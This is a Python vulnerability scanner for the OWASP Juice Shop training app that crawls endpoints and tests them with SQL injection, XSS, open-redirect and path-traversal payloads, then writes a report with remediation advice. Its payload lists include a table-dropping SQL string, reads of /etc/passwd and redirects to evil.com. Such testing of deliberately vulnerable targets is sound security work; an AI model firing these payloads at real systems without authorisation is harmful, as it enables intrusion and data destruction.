#!/usr/bin/env python3
"""
Custom Vulnerability Scanner for OWASP Juice Shop

This script performs targeted scanning of the OWASP Juice Shop application,
focusing on discovering SQL injection and Cross-Site Scripting vulnerabilities.
"""

import json
import os
import sys
import requests
import argparse
import time
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

# Configuration
DEFAULT_TARGET = "http://localhost:3000"
OUTPUT_DIR = "results"
REPORT_FILENAME = "juiceshop_vulnerability_report.md"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
TIMEOUT = 10

# Vulnerability types
VULN_TYPES = {
    "SQL_INJECTION": {
        "name": "SQL Injection",
        "description": "Vulnerability allowing an attacker to inject SQL commands",
        "severity": "HIGH",
        "detection_patterns": ["SQL syntax", "mysql", "ORA-", "sqlite", "PostgreSQL", "SQLSTATE", "Warning: mysql"]
    },
    "XSS": {
        "name": "Cross-Site Scripting (XSS)",
        "description": "Vulnerability allowing injection of malicious scripts into web pages",
        "severity": "MEDIUM",
        "detection_patterns": ["<script>", "alert(", "onerror=", "onload=", "javascript:"]
    },
    "OPEN_REDIRECT": {
        "name": "Open Redirect",
        "description": "Vulnerability allowing redirection to arbitrary external domains",
        "severity": "MEDIUM",
        "detection_patterns": ["redirect=", "url=", "return_to=", "redir=", "return_url="]
    },
    "PATH_TRAVERSAL": {
        "name": "Path Traversal",
        "description": "Vulnerability allowing access to files outside the web root directory",
        "severity": "HIGH",
        "detection_patterns": ["../", "..\\", "%2e%2e%2f", "file://", "/etc/passwd", "\\Windows\\"]
    }
}

# Test payloads
SQL_PAYLOADS = [
    "' OR 1=1--",
    "' OR '1'='1",
    "1' OR '1'='1",
    "' UNION SELECT 1,2,3--",
    "1; DROP TABLE users--",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
    "admin' --",
    "admin'/*",
    "' or 1=1#",
    "') or ('1'='1--",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "\"><script>alert('XSS')</script>",
    "' onmouseover='alert('XSS')",
    "<body onload=alert('XSS')>",
    "<img src=\"javascript:alert('XSS')\">",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    "';alert('XSS');//",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "\\\\evil.com",
    "javascript:alert(document.domain)",
    "/\\evil.com",
    "%09//evil.com",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\Windows\\system.ini",
    "file:///etc/passwd",
    "/etc/passwd",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "....//....//....//etc/passwd",
]

# Combine all payloads
ALL_PAYLOADS = {
    "SQL_INJECTION": SQL_PAYLOADS,
    "XSS": XSS_PAYLOADS,
    "OPEN_REDIRECT": OPEN_REDIRECT_PAYLOADS,
    "PATH_TRAVERSAL": PATH_TRAVERSAL_PAYLOADS
}

class VulnerabilityFinding:
    """Represents a vulnerability finding"""
    def __init__(self, title, description, severity, url, vulnerability_type, payload=None, evidence=None, request_method=None):
        self.title = title
        self.description = description
        self.severity = severity
        self.url = url
        self.vulnerability_type = vulnerability_type
        self.payload = payload
        self.evidence = evidence
        self.request_method = request_method
        self.timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
    def to_dict(self):
        """Convert finding to dictionary"""
        return {
            "title": self.title,
            "description": self.description,
            "severity": self.severity,
            "url": self.url,
            "vulnerability_type": self.vulnerability_type,
            "payload": self.payload,
            "evidence": self.evidence,
            "request_method": self.request_method,
            "timestamp": self.timestamp
        }
        
    def __str__(self):
        return (f"[{self.severity}] {self.title}\n"
                f"URL: {self.url}\n"
                f"Type: {self.vulnerability_type}\n"
                f"Payload: {self.payload}\n"
                f"Evidence: {self.evidence}\n"
                f"Method: {self.request_method}\n"
                f"Timestamp: {self.timestamp}")


class JuiceShopScanner:
    """Scanner for the OWASP Juice Shop application"""
    
    def __init__(self, target_url=DEFAULT_TARGET, output_dir=OUTPUT_DIR):
        self.target_url = target_url
        self.output_dir = output_dir
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1"
        })
        self.findings = []
        self.crawled_urls = set()
        self.urls_to_crawl = []
        
    def scan(self):
        """Run the full scan"""
        print(f"[*] Starting scan of {self.target_url}")
        
        # Create output directory if it doesn't exist
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
            
        # Crawl the site to discover endpoints
        self._crawl()
        
        # Test each discovered endpoint
        self._test_endpoints()
        
        # Generate report
        self._generate_report()
        
        print(f"[*] Scan completed. Found {len(self.findings)} vulnerabilities.")
        
    def _crawl(self):
        """Crawl the site to discover endpoints"""
        print("[*] Crawling website to discover endpoints...")
        
        # Start with the main page
        self.urls_to_crawl.append(self.target_url)
        self.urls_to_crawl.append(urljoin(self.target_url, "/rest/user/login"))
        self.urls_to_crawl.append(urljoin(self.target_url, "/rest/products"))
        self.urls_to_crawl.append(urljoin(self.target_url, "/rest/basket"))
        self.urls_to_crawl.append(urljoin(self.target_url, "/rest/user/registration"))
        self.urls_to_crawl.append(urljoin(self.target_url, "/rest/track-order"))
        self.urls_to_crawl.append(urljoin(self.target_url, "/rest/captcha"))
        self.urls_to_crawl.append(urljoin(self.target_url, "/rest/product/search"))
        self.urls_to_crawl.append(urljoin(self.target_url, "/api/Users"))
        
        max_urls = 30  # Limit the number of URLs to crawl
        while self.urls_to_crawl and len(self.crawled_urls) < max_urls:
            current_url = self.urls_to_crawl.pop(0)
            
            # Skip if already crawled
            if current_url in self.crawled_urls:
                continue
                
            try:
                print(f"[+] Crawling: {current_url}")
                response = self.session.get(current_url, timeout=TIMEOUT, allow_redirects=True)
                self.crawled_urls.add(current_url)
                
                # Add form submission URLs for testing
                if "<form" in response.text:
                    forms = self._extract_forms(response.text)
                    for form_action in forms:
                        form_url = urljoin(current_url, form_action)
                        if form_url not in self.crawled_urls and form_url not in self.urls_to_crawl:
                            self.urls_to_crawl.append(form_url)
                
                # Extract additional URLs
                for url in self._extract_urls(response.text, current_url):
                    if url not in self.crawled_urls and url not in self.urls_to_crawl:
                        self.urls_to_crawl.append(url)
                        
            except Exception as e:
                print(f"[!] Error crawling {current_url}: {str(e)}")
                
        print(f"[*] Crawled {len(self.crawled_urls)} URLs")
    
    def _extract_forms(self, html):
        """Extract form actions from HTML"""
        # Very basic form extraction - for a real scanner, use a proper HTML parser
        form_actions = []
        form_start = 0
        while True:
            form_start = html.find("<form", form_start)
            if form_start == -1:
                break
                
            action_start = html.find("action=\"", form_start)
            if action_start != -1:
                action_start += 8  # Length of 'action="'
                action_end = html.find("\"", action_start)
                if action_end != -1:
                    form_actions.append(html[action_start:action_end])
                    
            form_start += 1
            
        return form_actions
    
    def _extract_urls(self, html, base_url):
        """Extract URLs from HTML"""
        extracted_urls = set()
        
        # Extract href attributes
        href_start = 0
        while True:
            href_start = html.find("href=\"", href_start)
            if href_start == -1:
                break
                
            href_start += 6  # Length of 'href="'
            href_end = html.find("\"", href_start)
            if href_end != -1:
                href = html[href_start:href_end]
                if href and not href.startswith("#") and not href.startswith("javascript:"):
                    full_url = urljoin(base_url, href)
                    # Only include URLs from the same host
                    if urlparse(full_url).netloc == urlparse(self.target_url).netloc:
                        extracted_urls.add(full_url)
                        
            href_start = href_end
        
        # Extract API endpoints from JavaScript
        # Look for patterns like '/api/someEndpoint' or '/rest/someEndpoint'
        api_patterns = ['/api/', '/rest/']
        for pattern in api_patterns:
            pattern_start = 0
            while True:
                pattern_start = html.find(pattern, pattern_start)
                if pattern_start == -1:
                    break
                    
                # Find the end of the URL (whitespace, quote, bracket, etc.)
                end_chars = ['"', "'", ' ', ')', '}', ']']
                end_indexes = [html.find(char, pattern_start) for char in end_chars]
                end_indexes = [idx for idx in end_indexes if idx != -1]
                
                if end_indexes:
                    api_end = min(end_indexes)
                    api_url = html[pattern_start:api_end]
                    full_url = urljoin(base_url, api_url)
                    extracted_urls.add(full_url)
                    
                pattern_start += len(pattern)
        
        return list(extracted_urls)
    
    def _test_endpoints(self):
        """Test each discovered endpoint for vulnerabilities"""
        print("[*] Testing endpoints for vulnerabilities...")
        
        # For each crawled URL, test for vulnerabilities
        for url in self.crawled_urls:
            print(f"[+] Testing: {url}")
            self._test_url_for_vulnerabilities(url)
            
    def _test_url_for_vulnerabilities(self, url):
        """Test a specific URL for vulnerabilities"""
        # Parse the URL to get query parameters
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # If URL has query parameters, test each parameter for vulnerabilities
        if query_params:
            for param_name, param_values in query_params.items():
                original_value = param_values[0] if param_values else ""
                self._test_parameter(url, param_name, original_value, "GET")
        
        # For POST endpoints, try testing with various payloads
        if any(url.endswith(endpoint) for endpoint in 
               ["/login", "/register", "/search", "/rest/user/login", "/rest/user/registration", 
                "/rest/product/search", "/api/Users"]):
            self._test_post_endpoint(url)
    
    def _test_parameter(self, url, param_name, original_value, method="GET"):
        """Test a specific parameter for vulnerabilities"""
        # Test each vulnerability type
        for vuln_type, payloads in ALL_PAYLOADS.items():
            for payload in payloads:
                modified_url = self._modify_parameter(url, param_name, payload)
                
                try:
                    # Send the request with the modified parameter
                    if method == "GET":
                        response = self.session.get(modified_url, timeout=TIMEOUT, allow_redirects=False)
                    else:  # POST
                        data = {param_name: payload}
                        response = self.session.post(url, data=data, timeout=TIMEOUT, allow_redirects=False)
                    
                    # Check if the vulnerability patterns are found in the response
                    if self._check_vulnerability(response, vuln_type, payload):
                        vulnerability = VULN_TYPES[vuln_type]
                        finding = VulnerabilityFinding(
                            title=f"{vulnerability['name']} in {param_name}",
                            description=f"{vulnerability['description']} in parameter '{param_name}'",
                            severity=vulnerability['severity'],
                            url=url,
                            vulnerability_type=vuln_type,
                            payload=payload,
                            evidence=self._extract_evidence(response, vuln_type),
                            request_method=method
                        )
                        self.findings.append(finding)
                        print(f"[!] Found {vuln_type} vulnerability in {url} - parameter: {param_name}")
                        
                except Exception as e:
                    print(f"[!] Error testing {url} for {vuln_type}: {str(e)}")
    
    def _modify_parameter(self, url, param_name, payload):
        """Modify a URL parameter with a payload"""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # Modify the specific parameter
        query_params[param_name] = [payload]
        
        # Rebuild the query string
        new_query = urlencode(query_params, doseq=True)
        
        # Reconstruct the URL
        new_url = parsed_url._replace(query=new_query).geturl()
        
        return new_url
    
    def _test_post_endpoint(self, url):
        """Test POST endpoints with various payloads"""
        # Common parameter names to test
        common_params = {
            "/login": ["email", "username", "password"],
            "/register": ["email", "username", "password", "passwordRepeat", "name"],
            "/search": ["q", "query", "search"],
            "/rest/user/login": ["email", "password"],
            "/rest/user/registration": ["email", "password", "passwordRepeat", "user"],
            "/rest/product/search": ["q", "query", "search"],
            "/api/Users": ["email", "password", "name"]
        }
        
        # Determine which parameters to test based on URL
        params_to_test = []
        for endpoint, params in common_params.items():
            if url.endswith(endpoint):
                params_to_test = params
                break
                
        if not params_to_test:
            params_to_test = ["username", "password", "email", "query", "q", "id"]
        
        # Test each parameter with each payload
        for param in params_to_test:
            for vuln_type, payloads in ALL_PAYLOADS.items():
                for payload in payloads:
                    try:
                        # Create POST data with payload
                        data = {param: payload}
                        
                        # Add some default values for other common parameters
                        if param != "email" and "email" in params_to_test:
                            data["email"] = "test@example.com"
                        if param != "password" and "password" in params_to_test:
                            data["password"] = "Test123!"
                        if param != "passwordRepeat" and "passwordRepeat" in params_to_test:
                            data["passwordRepeat"] = data.get("password", "Test123!")
                        
                        response = self.session.post(url, data=data, timeout=TIMEOUT, allow_redirects=False)
                        
                        # Check if the vulnerability patterns are found in the response
                        if self._check_vulnerability(response, vuln_type, payload):
                            vulnerability = VULN_TYPES[vuln_type]
                            finding = VulnerabilityFinding(
                                title=f"{vulnerability['name']} in {param}",
                                description=f"{vulnerability['description']} in POST parameter '{param}'",
                                severity=vulnerability['severity'],
                                url=url,
                                vulnerability_type=vuln_type,
                                payload=payload,
                                evidence=self._extract_evidence(response, vuln_type),
                                request_method="POST"
                            )
                            self.findings.append(finding)
                            print(f"[!] Found {vuln_type} vulnerability in {url} (POST) - parameter: {param}")
                            
                    except Exception as e:
                        print(f"[!] Error testing {url} (POST) for {vuln_type} in parameter {param}: {str(e)}")
    
    def _check_vulnerability(self, response, vuln_type, payload):
        """Check if a vulnerability is detected in the response"""
        patterns = VULN_TYPES[vuln_type]["detection_patterns"]
        
        # Check response status code for certain vulnerabilities
        if vuln_type == "OPEN_REDIRECT" and 300 <= response.status_code < 400:
            redirect_url = response.headers.get("Location", "")
            if any(pattern in redirect_url.lower() for pattern in ["evil.com", "javascript:"]):
                return True
        
        # Check if any patterns are found in the response
        response_text = response.text.lower()
        response_headers = str(response.headers).lower()
        
        for pattern in patterns:
            if pattern.lower() in response_text or pattern.lower() in response_headers:
                return True
                
        # Additional checks for specific vulnerability types
        if vuln_type == "SQL_INJECTION":
            sql_error_patterns = ["sql syntax", "mysql error", "odbc", "unclosed quotation", "quoted string", "sql error"]
            if any(pattern in response_text for pattern in sql_error_patterns):
                return True
                
            # Look for abnormal responses that might indicate successful SQL injection
            if "you have an error in your sql syntax" in response_text:
                return True
                
        elif vuln_type == "XSS":
            # Check if the payload is reflected in the response
            if payload.lower() in response_text:
                return True
                
        return False
    
    def _extract_evidence(self, response, vuln_type):
        """Extract evidence of vulnerability from the response"""
        response_text = response.text.lower()
        patterns = VULN_TYPES[vuln_type]["detection_patterns"]
        
        for pattern in patterns:
            pattern_index = response_text.find(pattern.lower())
            if pattern_index != -1:
                # Extract some context around the pattern (up to 100 characters)
                start = max(0, pattern_index - 50)
                end = min(len(response_text), pattern_index + len(pattern) + 50)
                return response_text[start:end]
                
        # If no specific pattern was found, extract response information
        if vuln_type == "OPEN_REDIRECT":
            return f"Status code: {response.status_code}, Location: {response.headers.get('Location', 'None')}"
            
        # Default: return status code and a portion of the response
        return f"Status code: {response.status_code}, Response excerpt: {response_text[:100]}"
    
    def _generate_report(self):
        """Generate a report of the findings"""
        report_path = os.path.join(self.output_dir, REPORT_FILENAME)
        
        with open(report_path, "w") as f:
            # Write report header
            f.write("# OWASP Juice Shop Vulnerability Scan Report\n\n")
            f.write(f"**Target:** {self.target_url}  \n")
            f.write(f"**Scan Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  \n")
            f.write(f"**Total Vulnerabilities Found:** {len(self.findings)}  \n\n")
            
            # Write executive summary
            f.write("## Executive Summary\n\n")
            severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
            for finding in self.findings:
                if finding.severity in severity_counts:
                    severity_counts[finding.severity] += 1
                    
            f.write("| Severity | Count |\n")
            f.write("|----------|-------|\n")
            for severity, count in severity_counts.items():
                f.write(f"| {severity} | {count} |\n")
            f.write("\n")
            
            # Write vulnerabilities by type
            f.write("## Vulnerabilities by Type\n\n")
            vuln_type_counts = {}
            for finding in self.findings:
                vuln_type = finding.vulnerability_type
                if vuln_type not in vuln_type_counts:
                    vuln_type_counts[vuln_type] = 0
                vuln_type_counts[vuln_type] += 1
                
            f.write("| Vulnerability Type | Count |\n")
            f.write("|-------------------|-------|\n")
            for vuln_type, count in vuln_type_counts.items():
                f.write(f"| {VULN_TYPES[vuln_type]['name']} | {count} |\n")
            f.write("\n")
            
            # Write detailed findings
            f.write("## Detailed Findings\n\n")
            
            for i, finding in enumerate(self.findings, 1):
                f.write(f"### {i}. {finding.title}\n\n")
                f.write(f"**Severity:** {finding.severity}  \n")
                f.write(f"**Vulnerability Type:** {VULN_TYPES[finding.vulnerability_type]['name']}  \n")
                f.write(f"**URL:** {finding.url}  \n")
                f.write(f"**Request Method:** {finding.request_method}  \n")
                f.write(f"**Description:** {finding.description}  \n")
                f.write(f"**Payload Used:** `{finding.payload}`  \n")
                f.write("\n**Evidence:**\n")
                f.write("```\n")
                f.write(finding.evidence or "No specific evidence captured")
                f.write("\n```\n\n")
                
                # Remediation guidance based on vulnerability type
                f.write("**Remediation:**\n")
                if finding.vulnerability_type == "SQL_INJECTION":
                    f.write(("Use parameterized queries or prepared statements instead of building SQL queries with string concatenation. "
                            "Implement proper input validation and use an ORM where possible.\n\n"))
                elif finding.vulnerability_type == "XSS":
                    f.write(("Implement content security policy (CSP) and use context-sensitive output encoding. "
                            "Validate and sanitize all user inputs. Consider using a modern framework that automatically escapes outputs.\n\n"))
                elif finding.vulnerability_type == "OPEN_REDIRECT":
                    f.write(("Implement a whitelist of allowed redirect destinations or use relative path redirects. "
                            "If dynamic redirects are necessary, implement indirect reference maps.\n\n"))
                elif finding.vulnerability_type == "PATH_TRAVERSAL":
                    f.write(("Use proper canonicalization and validation of file paths. "
                            "Implement access controls and avoid passing user-supplied input directly to file system operations.\n\n"))
                else:
                    f.write("Follow secure coding practices and implement proper input validation.\n\n")
                    
                f.write("---\n\n")
                
            # Write conclusion
            f.write("## Conclusion & Recommendations\n\n")
            if len(self.findings) > 0:
                f.write(("The OWASP Juice Shop application contains several security vulnerabilities that should be addressed. "
                        "Priority should be given to fixing SQL Injection and other high-severity issues identified in this report.\n\n"))
                
                f.write("**General Recommendations:**\n\n")
                f.write("1. Implement proper input validation for all user-supplied data\n")
                f.write("2. Use parameterized queries for all database operations\n")
                f.write("3. Implement proper output encoding to prevent XSS\n")
                f.write("4. Establish a security testing process as part of the development lifecycle\n")
                f.write("5. Consider implementing a web application firewall (WAF) as an additional layer of protection\n")
            else:
                f.write("No vulnerabilities were detected in the scan. However, this does not guarantee the absence of vulnerabilities. ")
                f.write("Regular security testing and code reviews are recommended to maintain the security of the application.\n")
                
        # Save findings to JSON for potential later processing
        json_report_path = os.path.join(self.output_dir, "juiceshop_vulnerabilities.json")
        with open(json_report_path, "w") as f:
            json.dump([finding.to_dict() for finding in self.findings], f, indent=4)
            
        print(f"[*] Report generated: {report_path}")
        print(f"[*] JSON data saved: {json_report_path}")


def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="OWASP Juice Shop Vulnerability Scanner")
    parser.add_argument("-t", "--target", default=DEFAULT_TARGET, help=f"Target URL (default: {DEFAULT_TARGET})")
    parser.add_argument("-o", "--output", default=OUTPUT_DIR, help=f"Output directory (default: {OUTPUT_DIR})")
    args = parser.parse_args()
    
    scanner = JuiceShopScanner(args.target, args.output)
    scanner.scan()

if __name__ == "__main__":
    main() 